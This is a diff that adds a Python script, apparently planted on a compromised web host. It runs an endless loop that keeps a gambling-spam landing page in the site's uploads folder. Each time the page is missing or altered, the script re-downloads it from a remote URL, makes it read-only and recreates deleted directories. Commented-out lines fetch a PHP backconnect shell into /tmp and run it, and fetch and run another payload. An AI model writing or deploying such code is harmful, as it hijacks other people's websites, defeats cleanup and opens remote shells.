@@ -1,0 +1,58 @@
+import os
+import time
+import os.path
+import shutil
+import hashlib
+
+xR = '\033[91m'
+xC = '\033[96m'
+xW = '\033[0m'
+xG = '\033[92m'
+
+### TheFirst
+#os.system("curl --silent https://raw.githubusercontent.com/Yourdream666/prv/main/bcp.psd -o /tmp/.s.lQsho.php")
+#backconnect = os.system("php /tmp/.s.lQsho.php")
+
+### PID
+#os.system("pgrep -n python > /tmp/.s.PGSQL.666541")
+#sv = open("/tmp/.s.PGSQL.666541").read()
+#ff = sv.replace('\n','')
+#print("{}[*] PID RUNNING = {}{}{}\nSaved to /tmp/.s.PGSQL.666541\n").format(xR,xR,ff,xG)
+
+### SATPAM LANDING PAGE
+dirs = "/home/u845032518/domains/ijcrr.com/public_html/uploads/"
+index = "/home/u845032518/domains/ijcrr.com/public_html/uploads/index.php"
+sourcemv = "/home/u845032518/domains/ijcrr.com/public_html/home/slider/05.jpg"
+sourceget = "https://res.cloudinary.com/toolar/raw/upload/v1651397825/tool/ijcrr._v05hq1.txt"
+def cronWar():
+    while True:
+        d = os.path.isdir(dirs) 
+        if d == True:
+            #bc = backconnect
+            v = os.path.exists(index)
+            if v == False:
+                os.system("cp '%s' '%s'" % (sourcemv, index))
+                os.system("wget -qO '%s' '%s'" % (index, sourceget))
+                pass
+                
+            x1 = ["https://bit.ly/daftaralo","https://bit.ly/daftarhub88","JOKER123","Joker123"]
+            for x in x1:
+                if x in open(index).read():
+                    print("{}[*] LP AMAN BOS! {}{}== {}Satpam {}Online {}maRic0re\n{}=> {}{}").format(xG,xW,xW,xR,xW,xC,xR,xW,index)
+                    #os.system("mkdir /tmp/npm-3144-8063cdfa; wget -qO /tmp/npm-3144-8063cdfa/py2.py; python /tmp/npm-3144-8063cdfa/py2.py") # panggil py2
+                    time.sleep(5)
+                else:
+                    print("{}[!] {}LP not detect").format(xR,xW)
+                    print("{}[*] {}creating file...").format(xC,xW)
+                    os.system("chmod 755 '%s'" % index)
+                    os.system("wget -qO '%s' '%s'" % (index, sourceget))
+                    os.system("chmod 444 '%s'" % index)
+                    pass
+
+        else:
+            print("{}[!] DIR ILANG {}== {}Sek Tak Recovery Dulu... {}=> {}{}").format(xR,xW,xR,xC,xW,dirs)
+            os.system("mkdir '%s'" % dirs)
+            time.sleep(5)
+
+cronWar()
+#python2
